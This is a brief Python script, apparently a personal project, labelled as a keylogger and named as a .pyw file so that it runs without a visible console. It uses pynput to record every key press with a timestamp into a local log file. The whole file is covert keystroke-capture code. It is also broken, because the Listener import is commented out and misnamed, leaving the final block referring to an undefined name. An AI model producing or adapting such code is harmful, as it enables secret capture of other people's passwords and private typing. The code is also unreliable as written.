#Prj: Keylogger
#Author: Daniel Gisolfi
#Date: 2.6.17
#keylogger.pyw
import pynput
#from pynput.keyboard import  key, listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level = logging.DEBUG, format = '%(asctime)s: %(message)s')

def on_press(key):
    logging.info(key)

with Listener(on_press=on_press) as listener:
    listener.join()